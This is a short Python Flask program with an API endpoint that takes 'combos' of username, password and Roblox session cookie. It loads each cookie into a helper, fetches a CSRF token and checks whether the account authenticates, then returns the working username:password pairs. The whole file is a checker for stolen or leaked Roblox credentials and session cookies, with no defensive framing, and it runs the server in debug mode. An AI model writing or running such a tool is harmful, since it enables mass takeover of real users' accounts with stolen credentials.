from flask import Flask, request, jsonify
from roblox_helper import RobloxHelper
import os

app = Flask(__name__)

@app.route('/api/validate', methods=['POST'])
def validate_combos():
    combos = request.json.get('combos', [])
    results = []
    for idx, combo in enumerate(combos, 1):
        parts = combo.strip().split(':')
        if len(parts) < 3:
            results.append({'idx': idx, 'combo': combo, 'status': 'invalid', 'reason': 'format'})
            continue
        user, passwd, cookie = parts[0], parts[1], ':'.join(parts[2:])
        helper = RobloxHelper(cookie)
        try:
            helper.get_csrf()
            user_id, user_name = helper.get_authenticated_user()
            if user_id:
                results.append({'idx': idx, 'combo': f'{user}:{passwd}', 'status': 'success'})
            else:
                results.append({'idx': idx, 'combo': f'{user}:{passwd}', 'status': 'failed'})
        except Exception as e:
            results.append({'idx': idx, 'combo': f'{user}:{passwd}', 'status': 'failed'})
    return jsonify(results)

if __name__ == '__main__':
    app.run(debug=True)